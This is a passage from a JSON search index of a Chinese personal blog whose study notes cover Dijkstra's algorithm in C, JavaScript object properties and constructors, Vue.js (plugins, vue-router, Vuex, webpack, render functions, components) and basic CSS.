，集合内的点是已经确定最短路的点，可以视为一个大整体，每次操作找出与集合相邻的点中距离起点最近的点加入集合中，并确定它的最短路为它的上家的最短路+该边权值，存在 dis 中；\n形成类似于：dis=[∞，∞，∞，∞，∞]，其中∞表示不可达；s=[a,b,c,d,e]\n✨每次选择离“整体”最近的一个点加入s，此处注意整体的概念，是所有已有点连成的一个图；\n先用邻接矩阵存储数据，考虑采用一个二重循环，每次寻找出距离集合最近的一个点，然后数组标记它已经加入集合，然后在用当前点对不在集合中的点进行松弛，进行 nn 次，整个操作就完成了（此处代码中默认起点是1）\nvoid dijkstra()\n&#123;\n    memset(dis,127/3,sizeof(dis));//初始化\n    v[1]=1;\n    dis[1]=0;\n    for(int i=1;i&lt;=n;++i)\n    &#123;\n        int k=0;\n        for(int j=1;j&lt;=n;++j)//找出距离最近的点\n            if(!v[j]&amp;&amp;(k==0||dis[j]&lt;dis[k]))\n                k=j;\n        v[k]=1;//加入集合\n        for(int j=1;j&lt;=n;++j)//松弛\n            if(!v[j]&amp;&amp;dis[k]+a[k][j]&lt;dis[j])\n                dis[j]=dis[k]+a[k][j];\n    &#125;\n&#125;\n\n\n#参考代码2：\n#include &lt;stdio.h>\n#include &lt;conio.h>\n#include &lt;stdlib.h>\n\n#define X 10000\n#define VertexNum  7  //实际上共有六个顶点（1---6）\n#define EdgeNum  9\n\nint Graph[VertexNum][VertexNum] =\n//0  1  2  3  4  5  6\n&#123; X, X, X, X, X, X, X,  //0\n  X, X, 6, 3, X, X, X,  //1\n  X, X, X, X, 5, X, X,  //2\n  X, X, 2, X, 3, 4, X,  //3\n  X, X, X, X, X, X, 3,  //4\n  X, X, X, X, 2, X, 5,  //5\n  X, X, X, X, X, X, X   //6\n&#125;;\n\nint Visited[VertexNum];\nint path[VertexNum];\nint Distance[VertexNum];\n\nvoid Dijkstra(int Begin)\n&#123;\n  int MinEdge, Vertex, i,j, Edges;\n  Edges = 1;\n  Visited[Begin] = 1;\n  for (i = 1; i&lt;VertexNum; i++) Distance[i] = Graph[Begin][i];\n\n  Distance[Begin] = 0;\n  printf(\"     1  2  3  4  5  6\\\\n\");\n  printf(\"-----------------------------------\\\\n\");\n  printf(\"s:%d\", Edges);\n  for( i=1; i&lt;VertexNum; i++)\n  if (Distance[i] == X) printf(\"  *\"); else printf(\"%3d\",Distance[i]);\n  printf(\"\\\\n\");\n  while( Edges&lt;VertexNum-1)\n  &#123;\n    Edges++; MinEdge = X;\n    for(j=1; j&lt;VertexNum; j++)\n    if (Visited[j]==0 &amp;&amp; MinEdge > Distance[j] )\n    &#123;\n Vertex = j; MinEdge = Distance[j];\n    &#125;\n    Visited[Vertex] = 1;\n    printf(\"s:%d\",Edges);\n    for(j=1; j&lt;VertexNum; j++)\n    &#123;\n      if (Visited[j] == 0 &amp;&amp; Distance[Vertex] + Graph[Vertex][j] &lt;Distance[j])\n      &#123;   Distance[j] = Distance[Vertex] + Graph[Vertex][j];\n   path[j] = Vertex;\n      &#125;\n      //printf(\"%6d\",Distance[j]);\n       if (Distance[j] == X) printf(\"  *\"); else printf(\"%3d\",Distance[j]);\n    &#125;\n    printf(\"\\\\n\");\n  &#125;\n&#125;\n\nvoid main()\n&#123;\n  \n  int i;\n  int k;\n // clrscr();\n  for(i=0; i&lt;VertexNum; i++) &#123; Visited[i] = 0;  path[i] = 1;&#125;\n  Dijkstra(1);\n  printf(\"\\\\n\\\\nAll Path-------------------------\\\\n\");\n\n\n  for(i=2; i&lt;VertexNum; i++) //printf(\"%5d\",Visited[i]);\n  &#123;\n     printf(\"[%d] \",Distance[i]);\n     k = i;\n     do\n     &#123;\n       printf(\"%d&lt;--\",k);\n       k  = path[k];\n     &#125; while (k!=1);\n     printf(\"1 \\\\n\");\n  &#125;\n&#125;\n\n","slug":"Dijkstra算法","date":"2021-04-09T10:03:45.000Z","categories_index":"算法","tags_index":"笔记,王道考研","author_index":"Martin"},{"id":"85b49fe66b43ca226c264187ac889eda","title":"关于C语言的一些奇奇怪怪","content":"关于C语言的一些奇奇怪怪1.编译后产生的exe文件在win10运行不了，报错：exe 与你运行的 Windows 版本不兼容。请查看计算机的系统信息，然后联系软件发布者。\n解决方案：待解决，展示没有弄清楚。以前编译的exe文件照样可以使用！！！离谱😀\n​    欢天喜地，解决啦！！！ 指令代码：gcc -m64 test.cpp -o test.exe\n​    注解： -m64 //输出64位exe        -m32 //输出32位exe 🤤\n2.将一个int数据切割？？？\n","slug":"C语言相关问题","date":"2021-03-05T12:56:45.000Z","categories_index":"编程","tags_index":"C语言","author_index":"Martin"},{"id":"95751cb221a8005beae2f8c8f2c4082e","title":"Javascript高级程序设计（6）","content":"CH66.1 对象//eailer\nvar person=new Object();\nperson.name=\"Martin\";\nperson.age=18;\nperson.job=\"Student\";\n\nperson.sayName=function()&#123;\n    alert(person.name);\n    console.log(person.name);\n&#125;;\n\nperson.sayAge=function()&#123;\n    alert(person.age);\n    console.log(person.age);\n&#125;;\n\nperson.sayJob=function()&#123;\n    alert(person.job);\n    console.log(person.job);\n&#125;;\n\n\n//Face to object\nvar person1=&#123;\n    name:\"Jack\",\n    age:21,\n    job:\"Software Engineer.\",\n\n    sayName:function()&#123;\n        console.log(this.name);\n    &#125;,\n    sayAge:function()&#123;\n        console.log(this.age);\n    &#125;,\n    sayJob:function()&#123;\n        console.log(this.job);\n    &#125;\n&#125;\n\n\n6.1.1 属性类型：数据属性和访问器属性（1）数据属性：​        Configurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；\n​        Enumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；\n​        Writable：表示能否修改属性得值；注：直接在对象上定义的属性，默认值为true；\n​        Value：属性的数据值；默认为undefined；\n使用Object.defineProperty()方法修稿属性默认得特性；三个参数：属性所在的对象，属性名，描述符对象（以上四个数据属性）；\n\nvar person2=&#123;&#125;;\nObject.defineProperty(person2,\"name\",&#123;\n    Writable:false,\n    value:\"Jack\"\n&#125;);\n\nalert(person2.name);\nperson1.name=\"Nancy\";\nalert(person2.name);\n\n//输出结果为Jack；非严格模式下，赋值被忽略；严格模式下，抛出错误；\n\n（2）访问器属性：​        Configurable:表示能否通过delete删除属性从而重新定义属性；修改特性；修改为访问器属性；注：直接在对象上定义的属性，默认值为true；\n​        Enumerable：表示能否通过for-in循环返回属性；注：直接在对象上定义的属性，默认值为true；        \n​        Get：读取属性时调用的函数，默认为undefined；\n​        Set：写入属性时使用，默认为undefined；\n//访问器属性实例\nvar book=&#123;\n    _year:2021,\n    edition:1\n&#125;;\nObject.defineProperty(book,\"year\",&#123;\n    get:function()&#123;\n        return this._year;\n    &#125;,\n    set:function(newValue)&#123;\n        this._year=newValue;\n        this.edition+=newValue-2021;\n    &#125;\n&#125;);\n\nbook.year=2023;\nalert(book.edition);\n\n6.1.2 定义多个属性：Object.defineproperties()方法\nvar book = &#123;&#125;;\nObject.defineProperties(book, &#123;\n    _year: &#123;\n        writable: true,\n        value: 2020\n    &#125;,\n    edition: &#123;\n        writable: true,\n        value: 1\n    &#125;,\n    year: &#123;\n        get: function () &#123;\n            return this._year;\n        &#125;,\n        set: function (newValue) &#123;\n            if (newValue > this._year) &#123;\n                this._year = newValue;\n                this.edition += newValue - 2020;\n            &#125;\n        &#125;\n    &#125;\n&#125;)\n\n\n6.2创建对象6.2.1工厂模式​    解决了创建对象的问题但是没有解决对象识别的问题；\n6.2.2构造函数模式​    （1）创建一个新对象；\n​    （2）将函数得作用域赋值给对象；\n​    （3）执行构造函数得代码，为对象添加属性；\n​    （4）返回新对象；\n\n//工厂模式方法\nfunction createPerson(name,age,job)&#123;\n    var o=Object();\n    o.name=name;\n    o.age=age;\n    o.job=job;\n    o.sayHi=function()&#123;\n        alert(o.name);\n    &#125;\n    return o;\n&#125;\n\n//构造函数方法模式\nfunction Person(name,age,job)&#123;\n    this.name=name;\n    this.age=age;\n    this.job=job;\n\n    //函数模式的缺点，sayName函数会在每个实例中重复一遍，解决方法：讲该函数移到Person外，this.sayName=sayName调用;\n    this.sayName=function()&#123;\n        alert(this.name);\n    &#125;;\n\n&#125;\n\nvar person1=createPerson(\"Martin\",18,\"Software enigneer\");\nvar person2=new Person(\"Matin\",20,\"Cyber Security Engineer\");\n\n\n\n6.2.3 原型模式\n好处：可以让所有对象实例共享它包含的属性和方法；（不必在构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中）\n","slug":"Javascript高级程序设计（6）","date":"2021-01-12T13:18:45.000Z","categories_index":"前端","tags_index":"笔记,Javascript,Javascript高级程序设计","author_index":"Martin"},{"id":"9f8342f8223f4f2e54d6e52f7a65c033","title":"Vue.js实战（8）","content":"Ch11 插件\n一、插件得创建和使用\n //公开的方法install，参数1：VUe构造器，参数2：可选对象     \nMyPlugin.install=function(Vue,options)&#123;\n            //全剧注册组件\n            Vue.component('component-name',&#123;\n                //组件内容\n            &#125;)\n            //添加实例方法\n            Vue.prototype.$Notice=function()&#123;\n                //逻辑。。\n            &#125;\n            //添加全局方法或属性\n            Vue.globalMethod=function()&#123;\n                //逻辑\n            &#125;\n            //添加全局混合\n            Vue.mixin(&#123;\n                mounted:function()&#123;\n                    //逻辑 \n                &#125;\n            &#125;)\n        &#125;\n//Vue.use()来使用插件\n        Vue.use(MyPlugin)\n\n二、前端路由与Vue-router\n​        1.实现方式\n\n利用url得hash，即所谓的锚点（#）\n\nHTML5得History模式：需要服务器支持\n2.vue-router基本用法\n//在webpack项目中安装vue-router\nnpm install --save vue-router\n\nimport Vue from 'vue'\nimport Router from 'vue-router'\n\nVue.use(Router)\n\n//index.js\nroutes: [\n    &#123;\n      path: '/',\n      component: Movie\n    &#125;,\n    &#123;\n      path:'/login',\n        //一次性全部加载\n      component:Login\n    &#125;,\n    &#123;\n      path:'/test',\n      component:Test\n    &#125;,\n    &#123;\n      path:'/index',\n      component:(resolve)=>require(['../components/Index.vue'],resolve)\n    &#125;,\n    &#123;\n      path:'/about',\n        //懒加载（按需加载）mwebpack会把每一个路由打包为一个js文件，当请求到该页面时，才会去加载这个页面得js\n      component:(resolve)=>require(['../components/About.vue'],resolve)\n    &#125;,\n    //包含了用户Id得路由，指向同一界面；\n     &#123;\n      path:'/user/:id',\n      component:(resolve)=>require(['../components/User.vue'],resolve)\n    &#125;\n  ] \n\n\n******************************\n\n\n3.ES6小语法\n在ES6中，使用let和const代替var来声明变量，const声明常量不可修改；\nlet和const得作用域是块（使用了异步路由后，编译出的每个js都叫做快（chunk)）；\n4.小细节\n在router.js中，设置mode为history才会开启HTML5得路由模式，通过’/‘设置路径，否则为’#‘\n5.跳转\n&lt;router-link to&#x3D;&quot;&#x2F;about&quot;&gt;About&lt;&#x2F;router-link&gt;\n\n    &#x2F;&#x2F;页面跳转方法2\n    &lt;button @click&#x3D;&quot;changeToMain&quot;&gt;Index&lt;&#x2F;button&gt;\n    \n     methods:&#123;\n    changeToMain()&#123;\n      &#x2F;&#x2F;不可以跳转到当前页面路由本身，会报出冗余错误\n      this.$router.push(&#39;&#x2F;passage&#39;);\n    &#125;\n  &#125;\ntag:tag可以指定渲染成什么标签，比如tag=”li”,会渲染成li\n\nreplace：使用后不可以使用返回键回到上一个页面\n\ngo:在history记录中向前或者向后退多少步，参数为整数   this.$router.go(-1)或(2)\n\n\n三、状态\n管理与Vuex\n​    1.状态管理与使用场景\nnpm install --save vuex\n\n​    2.Vuex得使用\n//main.js\nimport Vuex from 'Vuex'\n\nVue.use(Vuex);\n\nconst store=new Vuex.Store(&#123;\n      state:&#123;\n          //定义一个数据\n        \tcount:0\n      &#125;\n&#125;);\n\n//在任何vue文件中都可以获取该数据\n\n\n&lt;template&gt;\n    &lt;div&gt;\n        &#x2F;&#x2F;获取数据\n          &#123;&#123; $store.state.count &#125;&#125;\n    &lt;&#x2F;div&gt;\n&lt;&#x2F;template&gt;\n\n&lt;script&gt;\nexport default &#123;\n    name:&#39;Counter&#39;,\n    &#x2F;&#x2F;使用computed方法显示\n    computed:&#123;\n        count()&#123;\n            return this.$store.state.count;\n        &#125;\n    &#125;\n&#125;\n&lt;&#x2F;script&gt;\n\n&lt;style&gt;\n\n&lt;&#x2F;style&gt;\n\n3.修改vuex的数据\nconst store&#x3D;new Vuex.Store(&#123;\n      state:&#123;\n        count:0\n      &#125;,\n&#x2F;&#x2F;首先在store中声明两个mutations\n      mutations:&#123;\n&#x2F;&#x2F;increase可以再添加一个参数来控制数值改变的大小；\n        increase(state)&#123;\n          state.count+&#x3D;1;\n        &#125;,\n        decrease(state)&#123;\n          state.count-&#x3D;1;\n        &#125;\n      &#125;\n&#125;);\n\n\n&lt;template&gt;\n    &lt;div&gt;\n        &lt;button @click&#x3D;&quot;handleIncrease&quot;&gt;+1&lt;&#x2F;button&gt;\n          &#123;&#123; count &#125;&#125;\n        &lt;button @click&#x3D;&quot;handleDecrease&quot;&gt;-1&lt;&#x2F;button&gt;  \n    &lt;&#x2F;div&gt;\n&lt;&#x2F;template&gt;\n\n&lt;script&gt;\nimport Button from &#39;.&#x2F;Button.vue&#39;;\nexport default &#123;\n  components: &#123; Button &#125;,\n    name:&#39;Counter&#39;,\n    computed:&#123;\n        count()&#123;\n            return this.$store.state.count;\n        &#125;\n    &#125;,\n    &#x2F;&#x2F;使用methods方法来调用mutations实现数据修改；\n    methods:&#123;\n        handleIncrease:function()&#123;\n            this.$store.commit(&#39;increase&#39;);\n        &#125;,\n        handleDecrease:function()&#123;\n            this.$store.commit(&#39;decrease&#39;);\n        &#125;\n    &#125;\n&#125;\n&lt;&#x2F;script&gt;\n\nES6小语法：\n//函数的参数可以设定默认值，当没有传入参数使用默认参数;一个参数不够时，可以传入一个对象，无限扩展；\nincrease（state，n)&#123;\n    n=n || 1;\n&#125;\n\n4.高级用法\n","slug":"Vue.js实战（8）","date":"2020-12-05T13:18:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"db49ff597c4220005ea1e51dd4896898","title":"CSS笔记","content":"1.向 div 元素添加阴影\nbox-shadow: 20px 10px 5px pink;\n参数：长 宽 颜色\n2.display\n\n\n\nnone\n此元素不会被显示。\n\n\n\nblock\n此元素将显示为块级元素，此元素前后会带有换行符。\n\n\ninline\n默认。此元素会被显示为内联元素，元素前后没有换行符。\n\n\ninline-block\n行内块元素。（CSS2.1 新增的值）\n\n\n3.border-redius\n给div元素添加圆角的边框\n4.outline\n设置元素周围的轮廓\n\n\n\n值\n描述\n\n\n\noutline-color\n规定边框的颜色。参阅：outline-color 中可能的值。\n\n\noutline-style\n规定边框的样式。参阅：outline-style 中可能的值。\n\n\noutline-width\n规定边框的宽度。参阅：outline-width 中可能的值。\n\n\ninherit\n规定应该从父元素继承 outline 属性的设置。\n\n\n5.a:active 激活后样式{background-color:yellow;}\n","slug":"CSS特性","date":"2020-12-03T13:18:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"fc44072b13f1424ab91fdf2f4612367d","title":"Vue.js实战（7）","content":"Ch10 使用webpack一、webpack基础​    1.import和export\nvar config=&#123;\n    version:'1.1.0'\n&#125;;\nexport &#123; Config &#125;;\n\nexport var config=&#123;\n    versiom:'1.1.0'\n&#125;;\n\nexport function add(a,b)&#123;\n    return a+b;\n&#125;;\n\n\nimport &#123; Config &#125; from './config/js'\nimport &#123; add &#125; from './add.js'\n\n//默认输出\nexport default&#123;\n    \n&#125;;\n\n​    2.npm导入库\n​    import Vue from ‘vue’;\n​    import $ from ‘jquery’;\n​    3.webpack基本配置\n​        npm init  //初始化\n​        npm install webpack –sav-dev //作为开发依赖来安装webpack\n​        npm install webpack-dev-server –save-dev //安装开发环境服务器\n​        npm dev //启动本服务器\n​        webpack –progress –hide-modules //修建模组？\n​        npm install css-loader –save-dev\n​        npm install style-loader –save-dev\n​        npm install extract-text-webpack-plugin –save-dev\n​        npm run build //打包\n4.箭头函数\nrender：h=&gt;h(App)等同于：\nrender:function(h){\nreturn h(App)\n}也等同于：\nrender:h=&gt;{\nreturn h(App);\n****}\n注：箭头函数里得this指向与普通函数不同，箭头函数得this是定义时得对象，而不是使用时得对象；\n5.ES 6语法\ncomponents: &#123;\n   Title,\n   Button,\n &#125;,\n \n components:&#123;\n     vTitle:Title,\n     vButton:Button\n &#125;\n\n","slug":"Vue.js实战（7）","date":"2020-12-03T13:18:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"154b411750a352c86b05a7e9248c8363","title":"Vue.js实战（6）","content":"Ch8 自定义命令一、基本用法//全局注册\n\n    Vue.directive('focus',&#123;\n            //指令选项\n        &#125;)\n//局部注册，作用域在app内\n        var app=new Vue(&#123;\n            el:\"#app\",\n            directives:&#123;\n                focus:&#123;\n                    //指令选项\n                &#125;\n            &#125;\n        &#125;)\n\n\nbind：第一次绑定到元素时使用；\ninserted：被绑定元素插入父节点时使用；\nupdate：绑定元素模板更新时使用，不论绑定值是否发生变化；\ncomponentUpdated：被绑定元素完成一次更新周期时使用；\nunbind： 指令与元素解绑时调用；\n\n二、实战代码已经存在电脑\nCh9 Render函数一、Virtual Dom：一个JavaScript对象，在状态发生变化时，Virtual Dom会进行Diff运算，来更新需要被替换的DOM，并不是全部重新绘制；var vNode=&#123;\n    tag:'div',\n    attributes:&#123;\n        id:'main'\n    &#125;,\n    children:[\n        //p节点\n    ]\n&#125;\n\n1.vNode分类：\n\n\n\nNode\nFunction\n\n\n\nElementVnode\n普通元素节点\n\n\nTextVNode\n文本节点\n\n\nComponentVNode\n组件节点\n\n\nEmptyVNode\n无内容的注释节点\n\n\nCloneVNode\n克隆节点\n\n\n二、createElement用法1.传统方法：\n&lt;div id=\"app\">\n    &lt;ele>&lt;/ele>\n\n&lt;/div>\n\n&lt;script>\n    Vue.component('ele', &#123;\n        template: ' &lt;div id=\"element\" :class=\"&#123;show:show&#125;\" @click=\"handleClick\">元素内容&lt;/div>',\n        data: function () &#123;\n            return &#123;\n                show: true\n            &#125;\n        &#125;,\n        methods: &#123;\n            handleClick: function () &#123;\n                console.log('clock');\n            &#125;\n        &#125;\n    &#125;);\n\n    var app = new Vue(&#123;\n        el: \"#app\",\n    &#125;)\n&lt;/script>\n\n2.使用Render改写后\n&lt;div id=\"app\">\n    &lt;ele>&lt;/ele>\n&lt;/div>\n\n&lt;script>\n    Vue.component('ele', &#123;\n        render: function (createElement) &#123;\n            return createElement(\n                'div',\n                &#123;\n                    class: &#123;\n                        'show': this.show\n                    &#125;,\n                    attrs: &#123;\n                        id: 'element'\n                    &#125;,\n                    on: &#123;\n                        click: this.handleClick\n                    &#125;\n                &#125;,\n                '文本内容1'\n            )\n        &#125;,\n        data: function () &#123;\n            return &#123; show: true &#125;\n        &#125;,\n        methods: &#123;\n            handleClick: function () &#123;\n                console.log('click');\n            &#125;\n        &#125;\n    &#125;);\n\n    var app = new Vue(&#123;\n        el: \"#app\",\n    &#125;)\n&lt;/script>\n\n3，就此例而言，render得写法复杂于template写法，所以在合适的场景使用render\n4.约束：所有的组件树中，如果VNODE是组件或者含有slot，那么Vnode必须唯一\n5.render函数里创建了一个cloneVNode得工厂函数，通过递归将slot所有子节点克隆一份，并对VNode的关键属性也复制了一份；\n三、函数化组件​    1.vue提供了一个functional的布尔值选项，设置为true可以使组件无状态和无实例，也就没有data和this上下文；render返回虚拟节点也更加容易渲染；\n​    2.函数化组件得是适用场景：\n\n程序化得在多个组件中选择一个\n在将children，props，data传递给子组件之前操作他们；\n\n","slug":"Vue.js实战（6）","date":"2020-12-01T13:18:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"51d3872cd56d489d412dadd4338316da","title":"Vue笔记","content":"Vue实战问题\n\n  1.VScode中部分组件调用显示蓝色，部分显示红色？\n\n  2.标签组件出现Bug,无法显示标题，有待解决；\n\n\nCSS特性\n\ncursor规定要显示的光标的类型，此处pointer为一只手\nCSS 框模型概述\n\n\n3.padding 属性定义元素的内边距。padding 属性接受长度值或百分比值，但不允许使用负值\nh1 &#123;padding: 10px 0.25em 2ex 20%;&#125;\n\n注意：上下内边距与左右内边距一致；即上下内边距的百分数会相对于父元素宽度设置，而不是相对于高度。\n4.border 元素的边框就是围绕元素内容和内边据的一条或多条线。\n5.margin 属性接受任何长度单位，可以是像素、英寸、毫米或 em。\nmargin 可以设置为 auto。更常见的做法是为外边距设置长度值。\n6.外边距合并\n外边距合并（叠加）是一个相当简单的概念。但是，在实践中对网页进行布局时，它会造成许多混淆。\n简单地说，外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。\n当一个元素出现在另一个元素上面时，第一个元素的下外边距与第二个元素的上外边距会发生合并。\n注释：只有普通文档流中块框的垂直外边距才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并。\n","slug":"Vue实战问题","date":"2020-11-29T13:18:45.000Z","categories_index":"前端","tags_index":"笔记,VUE","author_index":"Martin"},{"id":"3d6dc10a512a2edc0cfd6fa6365ab02f","title":"Vue.js实战（5）","content":"Ch7 组件详解1.组件的创建使用&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    &lt;title>Document&lt;/title>\n    &lt;script src=\"./js/vue.js\">&lt;/script>\n&lt;/head>\n&lt;body>\n    &lt;div id=\"app\">\n        &lt;my-component1>&lt;/my-component1>\n    &lt;/div>\n\n    &lt;script>\n\n        Vue.component('my-component1',&#123;\n            template:'&lt;div>&lt;p>This is my component1&lt;/p>&lt;/div>'\n        &#125;);\n\n\n        var app=new Vue(&#123;\n            el:\"#app\",\n        &#125;);\n    &lt;/script>\n&lt;/body>\n&lt;/html>\n\n注意： a.组件需要注册之后才可以使用；    b.组件template中必须被一个元素包含，如&lt;div&gt;&lt;/div&gt;\n​           c.组件可以使用data,methods,computed; data必须是函数，然后return；\n2.组件数据的使用三个组件都能实现自增,但是数据互不影响\n&lt;div id=\"app\">\n       &lt;my-component2>&lt;/my-component2>\n       &lt;my-component2>&lt;/my-component2>\n       &lt;my-component2>&lt;/my-component2>\n   &lt;/div>\n   \n     Vue.component('my-component2',&#123;\n           template:'&lt;div>       &lt;p>Counter:&lt;/p>&lt;p>&#123;&#123; count &#125;&#125;&lt;/p>&lt;button type=\"button\" @click=\"count++\">+1&lt;/button>&lt;/div>',\n           data:function()&#123;\n               return&#123;\n                   count:0\n               &#125; \n           &#125;\n       &#125;);\n\n\n使用props传递数据​    1.组件除了复用以外，更重要的是组件之间的通信；props中声明的数据与组件data函数return的数据主要区别是props的来自父级，而data中的组件是自己的数据，作用域是组件本身；这两种数据都可以在template、computed和methods中使用；\n&lt;my-component3 message=\"来自父组件的数据！！\">&lt;/my-component3>\n\n\n       Vue.component('my-component3', &#123;\n           props: ['message'],\n           template: '&lt;div>&#123;&#123; message &#125;&#125;&lt;/div>'\n       &#125;);\n\n​    2.小细节\n\n\n&lt;my-component2 message&#x3D;&quot;[1,2,3]&quot;&gt;&lt;&#x2F;my-component2&gt;   &#x2F;&#x2F;messgae.length&#x3D;7\n&lt;my-component2 :message&#x3D;&quot;[1,2,3]&quot;&gt;&lt;&#x2F;my-component2&gt;\t&#x2F;&#x2F;messgae.length&#x3D;3 数组长度\n\n​         3.单向数据流：父级-&gt;子级，解耦，避免子级操作父级数据；若props作为需要抓变得原始值，可以用计算属性；\n​         4.数据验证\nVue.component('data-validator',&#123;\n          props:&#123;\n              propA:Number,\n              propB:[String,Number],\n              propC:&#123;\n                  type:Boolean,\n                  default:true\n              &#125;,\n              propD:&#123;\n                  type:Number,\n                  required:true\n              &#125;,\n              propE:&#123;\n                  type:Array,\n                  dafault:function()&#123;\n                      return [];\n                  &#125;,\n              //自定义验证器\n              propF:&#123;\n                  validator:function(value)&#123;\n                      return value>10;\n                  &#125;\n              &#125;\n              &#125;\n          &#125;\n      &#125;);\n\n4.组件通信\n​    1.自定义事件：子组件向父组件传递数据\n​    2.双向绑定的v-model组件需要满足下面两个要求：\n​                *接受一个value属性\n           *在有新的value前出发input事件\n\n​    3.使用中央时间总线Bus实现父子，兄弟，跨级的组件间通信\n​    4.父链 this.$parent   this.$children  尽管Vue允许这样的操作，业务中，子组件应该尽可能避免以来父组件的数据（解耦？？）建议使用props和$emit\n​    5.子组件索引：通过$refs来获取子组件实现（注意：$refs只在组件渲染完成之后才填充，并且他是非响应式的。仅仅作为一个应急方案，应当避免再模板和计算属性中使用$refs）\n4.使用slot分发内容当需要让组件组合使用，混合父组件的内容和子组件的模板时，用到slot，成为内容分发；\nprops传递数据，events触发事件，slot内容分发构成了Vue组建的3个API来源；\n​    1.作用域\n&lt;child-component>\n\t&#123;&#123; message &#125;&#125;  //绑定父组件的数据\n&lt;/child-component>\n\n\n&lt;child-component v-show=\"showMe\">&lt;/child-component> //绑定的是父组件\n\nvar app=new Vue(&#123;\n    el:\"#app\",\n    data:&#123;\n    showMe: True;\n&#125;\n&#125;);\n\n&lt;child-component v-show=\"showMe\">&lt;/child-component> //绑定的是子组件\n\nVue.component('child-component',&#123;\ntemplate:'&lt;div v-show=\"showMe\">&lt;/div>',\ndata:function()&#123;\n\tretunr &#123;\n\t\t\tshowMe:True\n&#125;\n&#125;\n&#125;)\n\n\n​    2.slot用法\n​                单个slot\n&lt;div id=\"app\">\n       &lt;child-component>&lt;/child-component>\n\n       &lt;child-component>\n           &lt;p>Car~~&lt;/p>\n   &lt;/child-component>\n   &lt;/div>\n   &lt;script>\n       Vue.component('child-component', &#123;\n           template: \"\\\n           &lt;div>\\\n               &lt;slot>\\\n                   &lt;p>您的购物车空空如也！&lt;/p>\\\n               &lt;/slot>\\\n           &lt;/div>\",\n\n       &#125;);\n\n       var app = new Vue(&#123;\n           el: \"#app\",\n       &#125;)\n   &lt;/script>\n\n​                具名slot和单个slot混用\n&lt;div id=\"app\">\n        &lt;child-component>\n            &lt;h2 slot=\"header\">此去经年&lt;/h2>\n            &lt;p>从前车马很慢，书信很慢，一生只够爱一个人。&lt;/p>\n            &lt;div slot=\"footer\">Writted By GuiGui&lt;/div>\n        &lt;/child-component>\n    &lt;/div>\n\n    &lt;script>\n        Vue.component('child-component', &#123;\n            template: '\\\n            &lt;div class=\"container\">\\\n                &lt;div class=\"header\">\\\n                    &lt;slot name=\"header\">&lt;/slot>\\\n                &lt;/div>\\\n                &lt;div class=\"main\">\\\n                    &lt;slot>&lt;/slot>\\\n                &lt;/div>\\\n                &lt;div class=\"footer\">\\\n                    &lt;slot name=\"footer\">&lt;/slot>\\\n                &lt;/div>\\\n            &lt;/div>',\n        &#125;);\n\n\n​    3.作用域插槽：使用一个可复用的模板替代已渲染元素。？？？\n​    4.访问slot：this.$slot.name;\n5.组件高级用法​    1.递归组件：组件在他的模板内递归调用自己，只要给组件设置name即可；可以用于开发具未知层级关系的独立组件；\n​    注：必须设置一个条件来限制递归数量，否则抛出错误：max stack size exceeded;\n​    2.内联模板：给组件标签使用inline-template特性，组件会把它的内容当作模板；\n​    3.动态组件：vue.js提供了一个特殊元素&lt;component&gt;用来挂载不同的组件，使用is特性来选择需要挂载的组件\n&lt;div id=\"app\">\n       &lt;component :is=\"currentChoose\">&lt;/component>\n       &lt;button @click=\"handleChangeView('A')\">红灯&lt;/button>\n       &lt;button @click=\"handleChangeView('B')\">黄灯&lt;/button>\n       &lt;button @click=\"handleChangeView('C')\">绿灯&lt;/button>\n   &lt;/div>\n\n\n   &lt;script>\n\n\n\n       var app = new Vue(&#123;\n           el: \"#app\",\n           components:&#123;\n               comA:&#123;\n                   template:'&lt;div style=\"color: red;\">A组件&lt;/div>'\n               &#125;,\n               comB:&#123;\n                   template:'&lt;div style=\"color: yellow;\">B组件&lt;/div>'\n               &#125;,\n               comC:&#123;\n                   template:'&lt;div style=\"color: green;\">C组件&lt;/div>'\n               &#125;,\n           &#125;,\n           data: &#123;\n               currentChoose:'comA',\n           &#125;,\n           methods: &#123;\n               handleChangeView:function(component)&#123;\n                   this.currentChoose='com'+component;\n               &#125;,\n           &#125;,\n       &#125;)\n   &lt;/script>\n\n​    4.异步组件：仅仅加载需要的组件，提高性能；（vue允许将组件定义为一个工厂函数，动态的解析组件，只在组件需要渲染时触发工厂函数，并且将结果缓存，用于再次渲染）\n6其他​    1.$nextTick 异步更新队列：vue仅仅会绘制最后一次改变，英雌因此当showtext=true的时候，其实还没有创建这个div，需要等到下一次刷新；\n&lt;div id=\"app\">\n       &lt;div id=\"div\" v-if=\"showText\">This is show me text;&lt;/div>\n       &lt;button @click=\"showMeText\">点击显示文本&lt;/button>\n   &lt;/div>\n\n\n   &lt;script>\n\n\n\n       var app = new Vue(&#123;\n           el: \"#app\",\n           data: &#123;\n               showText: false\n           &#125;,\n           methods: &#123;\n               showMeText: function () &#123;\n                   this.showText = true;\n                   this.$nextTick(function()&#123;\n                       var text=document.getElementById('div').innerHTML;\n                       console.log(text);\n                   &#125;);\n               &#125;\n           &#125;\n       &#125;)\n   &lt;/script>\n\n​    2.手动挂载实例$mount\n","slug":"Vue.js实战（5）","date":"2020-11-27T13:18:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"4e601fa07eb6409e94192a7246776ed2","title":"Vue.js实战（4）","content":"Ch66.1 表单基本用法及常用小组件&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    &lt;title>Document&lt;/title>\n    &lt;script 